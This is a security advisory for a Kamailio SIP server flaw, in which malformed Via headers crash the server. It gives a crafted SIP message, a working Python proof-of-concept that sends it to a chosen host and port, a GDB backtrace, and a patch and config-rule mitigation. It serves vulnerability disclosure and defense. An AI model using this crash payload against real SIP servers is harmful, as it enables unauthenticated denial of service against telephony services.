## Security vulnerability in Kamailio core related to Via header processing, denial of service possible.

- Author: Henning Westerholt <hw at skalatan.de>
- Fixed versions: Kamailio v5.1.4 and v5.0.7
- References: CVE-2018-XXXX
<!--- Kamailio Security Advisory: todo-->
- Tested vulnerable versions: 5.1, 4.0, git master
- Timeline:
    - Report date: 2018-06-03
    - Kamailio patch: 2018-06-03
    - Kamailio release with patch: 2018-06-05
    - Security advisory: 2018-06-13

### Description

There exists a security vulnerability in the Kamailio core related to Via header processing. A specially crafted SIP message with several invalid `Via` headers causes a segmentation fault and crashes Kamailio. The reason is missing input validation in the `crcitt_string_array` core function for calculating a CRC hash for To tags.  An additional error is present in the `check_via_address` core function, this function also misses input validation.

### Impact

Abuse of this vulnerability leads to denial of service in Kamailio. Further research may show that exploitation leads to remote code execution. This vulnerability is rather old and will probably also apply to older versions of Kamailio and maybe even OpenSER.

### How to reproduce the issue

The following SIP message with several invalid `Via` header can be used to reproduce the vulnerability:


```
INVITE sip:0 SIP/2.0
To: 0
Viaa: SIP/2.0/UDP
V
Via:
Via: SIP/2.0/UDP :]
```

You can use this python script to reproduce the crash:

```
#!/usr/bin/env python
import socket
import sys

for _ in range(2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((sys.argv[1], int(sys.argv[2])))

    msg = "INVITE sip:0 SIP/2.0\n" \
        "To: 0\n" \
        "Viaa: SIP/2.0/UDP\n" \
        "V\n" \
        "Via:\n" \
        "Via: SIP/2.0/UDP :]\n" \
        "\r\n"
    sock.sendall(msg)
```

Run using:

```
python crash.py <ip> <port>
```

The expected result is a crash in Kamailio.

Notes: 

- authentication is not required
- crash happens in the first module that tries to construct a SIP reply caused by the bogus message
- SIP extension does not need to exist
- Message can be sent over TCP or UDP

### GDB backtrace result

An example for an backtrace caused by this crash in GDB:

```
Program received signal SIGSEGV, Segmentation fault.
0x00000000004e93ee in crcitt_string_array (dst=0x7ffff6373961 <sl_tag_buf+33> "", src=0x7fffffffaa20, size=2) at core/crc.c:239
239                             ccitt = UPDCIT( *c, ccitt );
(gdb) bt
#0  0x00000000004e93ee in crcitt_string_array (dst=0x7ffff6373961 <sl_tag_buf+33> "", src=0x7fffffffaa20, size=2) at core/crc.c:239
#1  0x00007ffff6162309 in calc_crc_suffix (msg=0x7ffff72c37c8, tag_suffix=0x7ffff6373961 <sl_tag_buf+33> "") at ../../core/tags.h:55
#2  0x00007ffff6162f5c in sl_reply_helper (msg=0x7ffff72c37c8, code=500, reason=0x7ffff63739e0 <err_buf> "I'm terribly sorry, server error occurred (1/SL)", tag=0x0) at sl_funcs.c:166
#3  0x00007ffff61644c3 in sl_send_reply (msg=0x7ffff72c37c8, code=500, reason=0x7ffff63739e0 <err_buf> "I'm terribly sorry, server error occurred (1/SL)") at sl_funcs.c:304
#4  0x00007ffff6164ca7 in sl_reply_error (msg=0x7ffff72c37c8) at sl_funcs.c:362
#5  0x00007ffff6168245 in w_sl_reply_error (msg=0x7ffff72c37c8, str=0x0, str2=0x0) at sl.c:233
#6  0x000000000043966a in do_action (h=0x7fffffffd120, a=0x7ffff7290970, msg=0x7ffff72c37c8) at core/action.c:1067
#7  0x0000000000445e1d in run_actions (h=0x7fffffffd120, a=0x7ffff7290970, msg=0x7ffff72c37c8) at core/action.c:1565
#8  0x00000000004395d9 in do_action (h=0x7fffffffd120, a=0x7ffff72919b8, msg=0x7ffff72c37c8) at core/action.c:1058
#9  0x0000000000445e1d in run_actions (h=0x7fffffffd120, a=0x7ffff728bef0, msg=0x7ffff72c37c8) at core/action.c:1565
#10 0x00000000004360c5 in do_action (h=0x7fffffffd120, a=0x7ffff72ac508, msg=0x7ffff72c37c8) at core/action.c:691
#11 0x0000000000445e1d in run_actions (h=0x7fffffffd120, a=0x7ffff72ac098, msg=0x7ffff72c37c8) at core/action.c:1565
#12 0x00000000004360c5 in do_action (h=0x7fffffffd120, a=0x7ffff7287ba8, msg=0x7ffff72c37c8) at core/action.c:691
#13 0x0000000000445e1d in run_actions (h=0x7fffffffd120, a=0x7ffff7282420, msg=0x7ffff72c37c8) at core/action.c:1565
#14 0x00000000004465c2 in run_top_route (a=0x7ffff7282420, msg=0x7ffff72c37c8, c=0x0) at core/action.c:1654
#15 0x000000000058908d in receive_msg (buf=0xa56a60 <buf> "INVITE sip:0 SIP/2.0\nTo: 0\nViaa: SIP/2.0/UDP\nV\nVia:\nVia: SIP/2.0/UDP :]", len=71, rcv_info=0x7fffffffd740) at core/receive.c:331
#16 0x000000000046ca74 in udp_rcv_loop () at core/udp_server.c:554
#17 0x00000000004253d1 in main_loop () at main.c:1432
#18 0x000000000042d631 in main (argc=17, argv=0x7fffffffdc68) at main.c:2650
```

This security issue was discovered through extensive SIP message fuzzing with [afl](http://lcamtuf.coredump.cx/afl/) and an internal toolset.

### Solutions and recommendations

Apply the [patch](https://github.com/kamailio/kamailio/commit/ad68e402ece8089f133c10de6ce319f9e28c0692) from github or make use of a release that includes that patch (e.g. 5.1.4 or 5.0.7). For older Kamailio version and in case you need more time for an update you can add the following logic on top of to your `request_route` block in your kamailio configuration file. This will drop this malicious  message and prevent its processing.

```
if($(hdr(Viaa)[0]) != $null) {
    xlog("invalid Via header found - dropping message");
    drop;
}

```

### About Henning Westerholt

[Henning Westerholt](https://skalatan.de/about) is a core developer of Kamailio since 2007. He provides consulting services for Kamailio in the performance, reliability and security areas.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
